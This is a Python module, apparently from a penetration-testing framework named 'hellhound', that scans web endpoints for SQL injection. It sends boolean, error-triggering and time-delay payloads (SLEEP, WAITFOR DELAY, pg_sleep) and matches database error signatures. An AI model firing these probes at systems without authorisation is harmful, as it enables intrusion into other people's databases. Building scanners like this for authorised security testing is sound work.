import asyncio
import aiohttp
import time
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from hellhound.core import http_utils

NAME = "sqli_tester"
CATEGORY = "vuln"
DESCRIPTION = "Targeted SQL Injection Auditor (Error, Boolean, and Time-based)"

OPTIONS = [
    {"name": "concurrency", "type": int, "default": 5, "help": "Concurrent attack threads"},
    {"name": "timeout", "type": int, "default": 15, "help": "Request timeout (seconds)"},
    {"name": "time_delay", "type": int, "default": 5, "help": "Seconds for time-based sleep probes"},
    {"name": "enable_time_based", "type": bool, "default": True, "help": "Enable time-based (SLEEP) probes"},
]

# ─────────────────────────────────────────────────────────────────────────────
# SIGNATURES & PAYLOADS
# ─────────────────────────────────────────────────────────────────────────────

ERROR_SIGNATURES = [
    r"SQL syntax", r"mysql_fetch", r"ORA-[0-9]{5}", r"PostgreSQL query failed",
    r"Microsoft OLE DB Provider", r"SQLite/JDBCDriver", r"System.Data.SqlClient",
    r"Unclosed quotation mark", r"quoted string not properly terminated"
]

BOOLEAN_PROBES = [
    ("' AND 1=1--", "' AND 1=2--"),
    ("\" AND 1=1--", "\" AND 1=2--"),
    (" AND 1=1", " AND 1=2"),
]

TIME_PROBES = [
    "'; WAITFOR DELAY '0:0:{delay}'--",
    "'; SELECT SLEEP({delay})--",
    "'; SELECT pg_sleep({delay})--",
    "\" OR SLEEP({delay})--",
]

# ─────────────────────────────────────────────────────────────────────────────
# AUDITOR ENGINE
# ─────────────────────────────────────────────────────────────────────────────

class SQLIAuditor:
    def __init__(self, emit, session, options):
        self.emit = emit
        self.session = session
        self.options = options
        self.findings = []

    async def check_error_based(self, url, method, pname, original_value):
        """Checks for database error messages."""
        payload = original_value + "'"
        try:
            async with self.session.request(method, url, params={pname: payload}, timeout=self.options.get("timeout")) as r:
                body = await r.text()
                for sig in ERROR_SIGNATURES:
                    if re.search(sig, body, re.I):
                        return {"type": "ERROR_BASED", "evidence": f"Found SQL error: {sig}", "payload": payload}
        except:
            pass
        return None

    async def check_boolean_based(self, url, method, pname, original_value):
        """Checks for logical differences in response length/status."""
        for true_p, false_p in BOOLEAN_PROBES:
            try:
                # 1. True request
                async with self.session.request(method, url, params={pname: original_value + true_p}) as r1:
                    t_len = len(await r1.read())
                    t_status = r1.status
                
                # 2. False request
                async with self.session.request(method, url, params={pname: original_value + false_p}) as r2:
                    f_len = len(await r2.read())
                    f_status = r2.status
                
                # 3. Base request (optional baseline)
                if t_status == f_status and abs(t_len - f_len) > 20: # Threshold for logic flip
                    return {"type": "BOOLEAN_BASED", "evidence": f"Logic flip detected (Length T:{t_len} vs F:{f_len})", "payload": true_p}
            except:
                continue
        return None

    async def check_time_based(self, url, method, pname, original_value):
        """Checks for execution delays using a baseline heuristic."""
        if not self.options.get("enable_time_based"):
            return None

        delay = self.options.get("time_delay", 5)
        
        # Phase 1: Establish Baseline
        try:
            t0 = time.time()
            async with self.session.request(method, url, timeout=10) as r:
                await r.read()
                baseline = time.time() - t0
        except:
            baseline = 0.5 # Fallback
            
        # Threshold: Baseline + Delay - (small margin)
        # We also need to verify it wasn't just a slow request by doing a secondary check if positive.
        
        for p in TIME_PROBES:
            payload = p.format(delay=delay)
            try:
                t0 = time.time()
                async with self.session.request(method, url, params={pname: payload}, timeout=delay + 10) as r:
                    await r.read()
                    elapsed = time.time() - t0
                    
                    if elapsed >= (baseline + delay - 0.5):
                        # Potential hit, verify once more with a different delay to confirm linearity
                        # (The "Precision" step)
                        new_delay = delay + 2
                        new_payload = p.format(delay=new_delay)
                        t0_v = time.time()
                        async with self.session.request(method, url, params={pname: new_payload}, timeout=new_delay + 10) as r_v:
                            await r_v.read()
                            elapsed_v = time.time() - t0_v
                            
                            if elapsed_v >= (baseline + new_delay - 0.5):
                                return {
                                    "type": "TIME_BASED", 
                                    "evidence": f"Confirmed time-delay (Baseline: {baseline:.2f}s, Prob1: {elapsed:.2f}s, Prob2: {elapsed_v:.2f}s)", 
                                    "payload": payload
                                }
            except:
                continue
        return None

async def run(target, emit, options=None):
    emit.info(f"[*] SQLI_TESTER: Starting auditing phase for {target}")
    
    spider_intel = options.get("spider_intel", {}) if options else {}
    endpoints = spider_intel.get("endpoints", [])
    
    # Priority: params flagged by Hydra as SQLI_POTENTIAL
    hydra_intel = options.get("hydra_intel", {}) if options else {}
    surfaces = hydra_intel.get("surfaces", [])
    
    # If no surfaces, audit all Spider endpoints
    targets = []
    if surfaces:
        targets = [s for s in surfaces if s.get("recommended_auditor") == "sqli_tester" or "SQLI_POTENTIAL" in s.get("roles", [])]
    
    if not targets and endpoints:
        emit.info("    [i] No Hydra hints found. Auditing all Spider endpoints with dynamic parameters.")
        for ep in endpoints:
            params = ep.get("params", {})
            for p_items in params.values():
                for p in p_items:
                    targets.append({"url": ep.get("url"), "method": ep.get("method", "GET"), "parameter": p})

    if not targets:
        emit.warn("[!] No injection surfaces identified for SQLi testing.")
        return {"raw": "No targets", "signals": []}

    emit.info(f"    [i] Targeted audit on {len(targets)} surface(s)...")
    
    # UPDATE ANIMATION FOR SQLI
    emit.progress_update(0, label="SQL-INJECTION")

    findings = []
    async with aiohttp.ClientSession() as session:
        auditor = SQLIAuditor(emit, session, options or {})
        
        for i, t in enumerate(targets):
            url = t.get("url")
            method = t.get("method", "GET")
            pname = t.get("parameter")
            
            emit.progress_update(i + 1)
            emit.info(f"    [*] Auditing {pname} on {url}...")
            
            # Error-based
            res = await auditor.check_error_based(url, method, pname, "")
            if res:
                findings.append({**t, **res, "severity": "CRITICAL", "confidence": "CONFIRMED"})
                emit.warn(f"        [!] FOUND {res['type']}: {res['evidence']}")
                continue # If error found, usually don't need boolean/time for that param

            # Boolean-based
            res = await auditor.check_boolean_based(url, method, pname, "")
            if res:
                findings.append({**t, **res, "severity": "HIGH", "confidence": "STEALTH"})
                emit.warn(f"        [!] FOUND {res['type']}: {res['evidence']}")
                continue

            # Time-based
            res = await auditor.check_time_based(url, method, pname, "")
            if res:
                findings.append({**t, **res, "severity": "HIGH", "confidence": "STEALTH"})
                emit.warn(f"        [!] FOUND {res['type']}: {res['evidence']}")

    if findings:
        emit.success(f"[+] SQLI_TESTER complete. Found {len(findings)} vulnerabilities!")
    else:
        emit.info("[-] No SQL injection found on identified surfaces.")

    return {
        "raw": f"Audited {len(targets)} surfaces. Found {len(findings)} SQLi.",
        "intel": {
            "vulnerabilities": findings
        },
        "signals": ["SQLI_FOUND" if findings else "NO_SQLI"]
    }
